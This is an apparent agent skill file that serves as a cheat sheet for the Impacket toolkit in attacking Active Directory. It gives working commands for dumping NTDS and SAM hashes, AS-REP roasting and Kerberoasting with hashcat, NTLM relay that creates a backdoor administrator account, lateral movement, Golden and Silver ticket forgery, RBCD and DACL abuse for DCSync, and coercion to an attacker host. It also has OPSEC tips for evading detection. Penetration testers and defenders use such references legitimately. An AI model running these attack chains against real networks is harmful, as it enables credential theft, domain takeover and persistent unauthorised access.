---
name: impacket
description: "Auth/lab ref: Python toolkit for SMB/Kerberos/NTLM/LDAP protocol testing in Active Directory."
license: Apache-2.0
compatibility: "Linux/macOS/Windows; Python 3.8+."
metadata:
  author: AeonDave
  version: "1.0"
---

# Impacket

Python AD/Windows attack toolkit — credentials, relay, lateral movement, Kerberos, delegation, ACL.

## Installation

```bash
pipx install impacket
# or from source (latest)
git clone https://github.com/fortra/impacket && pip install -e impacket/

# Scripts location (Kali)
ls /usr/share/doc/python3-impacket/examples/
```

## Authentication Syntax (shared across all scripts)

```bash
# Cleartext password
script.py DOMAIN/user:password@TARGET

# NTLM hash (pass-the-hash)
script.py DOMAIN/user@TARGET -hashes :NTHASH
script.py DOMAIN/user@TARGET -hashes LMHASH:NTHASH

# Kerberos ticket (pass-the-ticket, set KRB5CCNAME)
export KRB5CCNAME=/tmp/admin.ccache
script.py DOMAIN/user@TARGET -k -no-pass

# AES key
script.py DOMAIN/user@TARGET -aesKey AESKEY256

# Anonymous / no-auth
script.py //TARGET -no-pass
```

---

## 1. Credential Dumping

### secretsdump.py

> **RODC KeyList mode** — extract credentials from the writable DC via the RODC's krbtgt key. kvno encoding and PRP prerequisites: `active-directory-technique/references/rodc-attacks.md`.

```bash
# KeyList attack: auth as RODC machine account, forge partial TGT with krbtgt_XXXXX key
secretsdump.py -use-keylist -rodcNo XXXXX -rodcKey <krbtgt_XXXXX_aes256> \
  'DOMAIN/RODC01$:password@DC01.DOMAIN.LOCAL' -dc-ip DC_IP
```

**impacket-specific patches** (source patches, not the general kvno rule above):
- `getAllowedUsersToReplicate()` hardcodes deny for RIDs 500-503. Patch to force specific targets: replace `return targetList` with `return ['Administrator:500']`.
- `createPartialTGT()` defaults kvno to `self.__keyVersionNumber << 16` (kvno_low = 0) — patch to the correct encoding if `-rodcNo` support is unavailable.
- RC4-only partial TGTs fail with `KRB_AP_ERR_BAD_INTEGRITY` if domain disabled RC4. Patch etype to `aes256_cts_hmac_sha1_96` and session key length to 32 bytes.

Dump NTDS.dit (remote or local), SAM, LSA secrets, cached credentials.

```bash
# Remote — DC via DCSync (requires DA or replication rights)
secretsdump.py DOMAIN/administrator:password@DC_IP

# Remote — SMB + reg (requires local admin)
secretsdump.py DOMAIN/administrator:password@TARGET

# Pass-the-hash
secretsdump.py DOMAIN/administrator@DC_IP -hashes :NTHASH

# Local — offline NTDS + SYSTEM hive
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL

# Extract just NTLM hashes (grep-friendly)
secretsdump.py DOMAIN/admin:pass@DC_IP | grep ':::' | cut -d: -f1,4
```

**Output parsing:**

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117:::
           ^username ^RID ^LM hash                  ^NT hash
```

**Tricks:**
- Use `-just-dc-ntlm` to skip Kerberos/history, faster on large domains
- `-just-dc-user krbtgt` for targeted single-user dump (stealthy)
- `-history` dumps password history hashes for cracking

```bash
# Fast targeted dump
secretsdump.py DOMAIN/admin:pass@DC -just-dc-ntlm

# krbtgt only (Golden Ticket prep)
secretsdump.py DOMAIN/admin:pass@DC -just-dc-user krbtgt
```

---

### samrdump.py

Enumerate users via SAMR (no DA needed, domain user sufficient).

```bash
samrdump.py DOMAIN/user:pass@TARGET
```

---

## 2. AS-REP Roasting

### GetNPUsers.py

Find users with Kerberos pre-auth disabled, request AS-REP hash for offline cracking.

```bash
# With domain user creds (most reliable)
GetNPUsers.py DOMAIN/user:pass -dc-ip DC_IP -format hashcat -outputfile asrep.txt

# No creds — enumerate from list
GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip DC_IP -no-pass -format hashcat

# Request for specific user
GetNPUsers.py DOMAIN/targetuser -dc-ip DC_IP -no-pass -format hashcat

# Crack output
hashcat -a 0 -m 18200 asrep.txt /wordlist/rockyou.txt
```

---

## 3. Kerberoasting

### GetUserSPNs.py

Request TGS for SPN-registered accounts; hash crackable offline.

```bash
# List kerberoastable accounts
GetUserSPNs.py DOMAIN/user:pass -dc-ip DC_IP

# Dump hashes (hashcat format)
GetUserSPNs.py DOMAIN/user:pass -dc-ip DC_IP -request -outputfile spns.txt

# Targeted
GetUserSPNs.py DOMAIN/user:pass -dc-ip DC_IP -request-user svc_sql

# Crack
hashcat -a 0 -m 13100 spns.txt /wordlist/rockyou.txt
```

---

## 4. NTLM Relay

### ntlmrelayx.py

Relay captured NTLM auth to SMB/LDAP/HTTP/MSSQL/RDP. Works with Responder (disable SMB/HTTP in Responder.conf first).

```bash
# Relay to SMB — exec command on target
ntlmrelayx.py -t smb://TARGET -smb2support -c "net user hacker P@ss123 /add && net localgroup administrators hacker /add"

# Relay to LDAP — dump domain info
ntlmrelayx.py -t ldap://DC_IP -smb2support --dump-laps --dump-adcs

# Relay to LDAP — add computer (for RBCD attack)
ntlmrelayx.py -t ldap://DC_IP -smb2support --add-computer EVILPC EVILPASS

# Relay to LDAP — set RBCD on target machine
ntlmrelayx.py -t ldap://DC_IP -smb2support --delegate-access --escalate-user DOMAIN\\currentuser

# Multi-target relay
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami > C:\Windows\Temp\r.txt"

# Relay to MSSQL — execute OS command
ntlmrelayx.py -t mssql://TARGET -smb2support -q "EXEC xp_cmdshell 'whoami'"

# Socks relay (interactive post-relay access)
ntlmrelayx.py -t smb://TARGET -smb2support -socks
# Then use proxychains with script against 127.0.0.1:1080
```

**Responder + relay setup:**
```bash
# Terminal 1 — Responder (no SMB/HTTP)
sed -i 's/SMB = On/SMB = Off/;s/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf
responder -I eth0 -wP

# Terminal 2 — relay
ntlmrelayx.py -t smb://TARGETS -smb2support -c "PAYLOAD"
```

### smbserver.py

Host SMB share (capture hashes, deliver payloads).

```bash
# Share current dir (anonymous)
smbserver.py -smb2support SHARE .

# Share with auth (force NTLM)
smbserver.py -smb2support -username user -password pass SHARE /path/to/dir
```

---

## 5. Lateral Movement

### psexec.py

Full interactive shell via SVCManager. Noisy — drops binary, creates service.

```bash
psexec.py DOMAIN/admin:pass@TARGET
psexec.py DOMAIN/admin@TARGET -hashes :NTHASH
psexec.py DOMAIN/admin@TARGET -k -no-pass   # Kerberos
```

### wmiexec.py

Semi-interactive shell via WMI. No binary drop; output via SMB. Less detected than psexec.

```bash
wmiexec.py DOMAIN/admin:pass@TARGET
wmiexec.py DOMAIN/admin@TARGET -hashes :NTHASH
wmiexec.py DOMAIN/admin:pass@TARGET -nooutput   # fire-and-forget, no output capture
wmiexec.py DOMAIN/admin:pass@TARGET -shell-type powershell
```

### smbexec.py

> **Output capture caveat**: smbexec writes output via a file on the target share. When running over tunnels (chisel, SSH), output may appear blank. Commands ARE executing — verify by redirecting to a file (`cmd > C:\out.txt 2>&1`) and reading it via SMB.
> Same applies to mimikatz over smbexec/SCM — no console is allocated, so `> file 2>&1` produces an empty file. Use mimikatz's own `log` command instead; see the `mimikatz` skill's Headless execution section.

Command exec via SMB (no shell, one-shot). Creates temp service per command.

```bash
smbexec.py DOMAIN/admin:pass@TARGET
smbexec.py DOMAIN/admin@TARGET -hashes :NTHASH
```

### dcomexec.py

Exec via DCOM (MMC20.Application, ShellWindows, ShellBrowserWindow). No service creation.

```bash
dcomexec.py DOMAIN/admin:pass@TARGET "cmd /c whoami > C:\Windows\Temp\o.txt"
dcomexec.py -object MMC20 DOMAIN/admin:pass@TARGET "cmd /c ..."
```

### atexec.py

Execute via Task Scheduler (AT command equivalent). Output returned via SMB.

```bash
atexec.py DOMAIN/admin:pass@TARGET "cmd /c whoami"
```

**Lateral movement comparison:**

| Script | Detection risk | Shell type | Binary drop |
|--------|---------------|-----------|-------------|
| psexec | HIGH | Interactive | Yes |
| wmiexec | MEDIUM | Semi-interactive | No |
| smbexec | MEDIUM | Semi-interactive | No (service) |
| dcomexec | LOW-MEDIUM | Semi-interactive | No |
| atexec | LOW | Output capture only | No |

---

## 6. SMB / File Operations

### smbclient.py

Interactive SMB shell for file browsing and transfer.

```bash
smbclient.py DOMAIN/user:pass@TARGET
# Inside: ls, cd, get, put, rm, mkdir

# PTH
smbclient.py DOMAIN/user@TARGET -hashes :NTHASH
```

### lookupsid.py

RID cycling to enumerate users without authentication (anonymous or user-level).

```bash
# Enumerate all users/groups via RID brute
lookupsid.py DOMAIN/user:pass@TARGET 2000
lookupsid.py -no-pass anonymous@TARGET 2000

# Extract just usernames
lookupsid.py DOMAIN/user:pass@TARGET 2000 | grep SidTypeUser | awk '{print $2}' | cut -d'\' -f2
```

### rpcdump.py

Enumerate RPC endpoints — useful for discovering services and attack surface.

```bash
rpcdump.py DOMAIN/user:pass@TARGET
rpcdump.py @TARGET  # no auth
```

---

## 7. Kerberos Ticket Operations

### getTGT.py

Request TGT for an account.

```bash
# Password
getTGT.py DOMAIN/user:pass -dc-ip DC_IP

# Hash (overpass-the-hash)
getTGT.py DOMAIN/user -hashes :NTHASH -dc-ip DC_IP

# AES key
getTGT.py DOMAIN/user -aesKey AESKEY -dc-ip DC_IP

# Use ticket
export KRB5CCNAME=user.ccache
```

### getTGS.py

Request TGS for a specific service.

```bash
getTGS.py DOMAIN/user:pass -spn cifs/TARGET.DOMAIN -dc-ip DC_IP
```

### ticketer.py

Forge Golden or Silver tickets offline.

```bash
# Golden Ticket (requires krbtgt NTLM hash + domain SID)
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain DOMAIN.LOCAL administrator

# Silver Ticket (requires service account NTLM hash + SPN)
ticketer.py -nthash SVC_HASH -domain-sid S-1-5-21-... -domain DOMAIN.LOCAL -spn cifs/TARGET administrator

# RODC Golden Ticket (if -rodcNo flag is available)
ticketer.py -aesKey KRBTGT_XXXXX_AES256 -domain-sid S-1-5-21-... -domain DOMAIN.LOCAL \
  -rodcNo XXXXX -user-id 500 -groups '512,520,513,519,518' Administrator

# RODC Golden Ticket (manual kvno patch if -rodcNo not available)
# Edit ticketer.py: change kdcRep['ticket']['enc-part']['kvno'] = 2
# to kdcRep['ticket']['enc-part']['kvno'] = (RODC_NUMBER << 16) | kvno_low
# where kvno_low = msDS-KeyVersionNumber of krbtgt_XXXXX (usually 1)
ticketer.py -aesKey KRBTGT_XXXXX_AES256 -domain-sid S-1-5-21-... -domain DOMAIN.LOCAL \
  -user-id 500 -groups '512,520,513,519,518' Administrator

# Then request TGS from the writable DC
export KRB5CCNAME=Administrator.ccache
getST.py -spn cifs/DC01.DOMAIN.LOCAL -dc-ip DC_IP -k -no-pass 'DOMAIN.LOCAL/Administrator'
export KRB5CCNAME=Administrator@cifs_DC01.DOMAIN.LOCAL@DOMAIN.LOCAL.ccache
psexec.py -k -no-pass DOMAIN.LOCAL/Administrator@DC01.DOMAIN.LOCAL

# Use ticket
export KRB5CCNAME=administrator.ccache
wmiexec.py -k -no-pass DOMAIN/administrator@TARGET
```

### raiseChild.py

MS14-068 — escalate child domain user to Enterprise Admin via forged PAC.

```bash
raiseChild.py CHILD.DOMAIN/user:pass
```

---

## 8. Delegation Abuse

### findDelegation.py

Enumerate all delegation configs in domain.

```bash
findDelegation.py DOMAIN/user:pass -dc-ip DC_IP
```

**Output interpretation:**
- `Unconstrained` → machine/account caches all TGTs connecting to it
- `Constrained (Protocol Transition)` → S4U2Self+Proxy, high-value target
- `Resource-Based` → controlled by resource, target for RBCD attack

### addcomputer.py

Add machine account (MachineAccountQuota usually 10 by default) — prerequisite for RBCD.

```bash
addcomputer.py -computer-name EVILPC -computer-pass EvilPass123 -dc-ip DC_IP DOMAIN/user:pass
```

### rbcd.py

Set Resource-Based Constrained Delegation on target machine account.

```bash
# Grant EVILPC$ delegation rights over TARGET$
rbcd.py -action write -delegate-to TARGET$ -delegate-from EVILPC$ DOMAIN/user:pass -dc-ip DC_IP

# Verify
rbcd.py -action read -delegate-to TARGET$ DOMAIN/user:pass -dc-ip DC_IP
```

**Full RBCD chain:**
```bash
# 1. Add fake computer
addcomputer.py -computer-name EVIL$ -computer-pass EvilPass -dc-ip DC DOMAIN/user:pass

# 2. Set RBCD — grant EVIL$ rights over TARGET$
rbcd.py -action write -delegate-to TARGET$ -delegate-from EVIL$ DOMAIN/user:pass -dc-ip DC

# 3. Get TGT for EVIL$
getTGT.py DOMAIN/EVIL$ -dc-ip DC -hashes :HASH_OF_EVILPASS

# 4. S4U2Self + S4U2Proxy — impersonate Administrator over cifs/TARGET
export KRB5CCNAME=EVIL\$.ccache
getST.py DOMAIN/EVIL$ -spn cifs/TARGET.DOMAIN -impersonate administrator -dc-ip DC

# 5. Use service ticket
export KRB5CCNAME=administrator@cifs_TARGET.ccache
secretsdump.py -k -no-pass DOMAIN/administrator@TARGET
```

### getST.py

S4U2Self/S4U2Proxy — get service ticket impersonating another user.

```bash
getST.py DOMAIN/EVIL$ -spn cifs/TARGET.DOMAIN -impersonate administrator -dc-ip DC -hashes :HASH
```

---

## 9. ACL Abuse

### dacledit.py

Read and write DACLs on AD objects.

```bash
# List ACLs on target object
dacledit.py DOMAIN/user:pass -dc-ip DC -target "targetuser" -action read

# Grant GenericAll to attacker-controlled user
dacledit.py DOMAIN/user:pass -dc-ip DC -target "targetuser" -action write -rights FullControl -principal attackeruser

# Grant DCSync rights
dacledit.py DOMAIN/user:pass -dc-ip DC -target "DOMAIN.LOCAL" -action write -rights DCSync -principal attackeruser
```

### owneredit.py

Change owner of an AD object (enables further ACL manipulation).

```bash
# Take ownership of target user
owneredit.py DOMAIN/user:pass -dc-ip DC -target targetuser -new-owner attackeruser
```

---

## 10. Common Attack Chains

### Chain: No creds → credential dump

```bash
# 1. RID cycle — enumerate users
lookupsid.py -no-pass anonymous@TARGET 2000 | grep SidTypeUser | awk '{print $2}' | cut -d'\' -f2 > users.txt

# 2. AS-REP roast — no creds needed
GetNPUsers.py DOMAIN/ -usersfile users.txt -no-pass -dc-ip DC -format hashcat -outputfile asrep.txt

# 3. Crack
hashcat -a 0 -m 18200 asrep.txt rockyou.txt

# 4. Use recovered creds to Kerberoast
GetUserSPNs.py DOMAIN/crackeduser:crackedpass -dc-ip DC -request -outputfile spns.txt
hashcat -a 0 -m 13100 spns.txt rockyou.txt
```

### Chain: Local admin → domain dump

```bash
# 1. secretsdump (local admin → SAM)
secretsdump.py DOMAIN/localadmin:pass@TARGET

# 2. PTH with NTLM from SAM to reach DC
secretsdump.py DOMAIN/administrator@DC_IP -hashes :ADMIN_NTHASH -just-dc-ntlm
```

### Chain: Relay (no creds) → DA

```bash
# Pre-requisite: SMB signing disabled on targets, you have network position

# 1. Find hosts with SMB signing off
nmap -p 445 --script smb2-security-mode 192.168.1.0/24 | grep -B3 "signing: disabled"

# 2. Start relay
ntlmrelayx.py -tf no_signing.txt -smb2support --dump-laps -l loot/

# 3. Trigger auth (Responder, PetitPotam, Coercer)
responder -I eth0 -wP   # passive
# or active
coercer.py -t TARGET -l ATTACKER_IP
```

### Chain: WriteDACL → DCSync

```bash
# 1. Confirm WriteDACL on domain object
dacledit.py DOMAIN/user:pass -dc-ip DC -target "DOMAIN.LOCAL" -action read | grep WriteDacl

# 2. Grant ourselves DCSync rights
dacledit.py DOMAIN/user:pass -dc-ip DC -target "DOMAIN.LOCAL" -action write -rights DCSync -principal user

# 3. DCSync
secretsdump.py DOMAIN/user:pass@DC -just-dc-ntlm
```

---

## OPSEC Notes

- `psexec` → creates `PSEXESVC` service, drops binary to `ADMIN$`. High detection.
- `wmiexec` → uses WMI provider host (`wmiprvse.exe`), output over SMB pipe. Medium detection.
- `secretsdump` DCSync → generates replication events (Event 4662). Monitored on hardened DCs.
- NTLM relay → network-level; no host artifact if relay-only (no -c payload).
- Use `-k` (Kerberos) when possible — no NTLM challenges in traffic. (Note: Kerberos requires synchronized clocks. If you see `KRB_AP_ERR_SKEW`, prefix your command with `faketime '+2h'` or use `ntpdate -u <DC>`).
- Prefer `dcomexec` or `atexec` over `psexec` when stealth matters.

## Resources

| File | When to load |
|------|--------------|
| `references/relay-and-delegation-internals.md` | NTLM coercion methods, relay target decision tree, S4U protocol internals, DCSync alternatives, Kerberos clock sync |
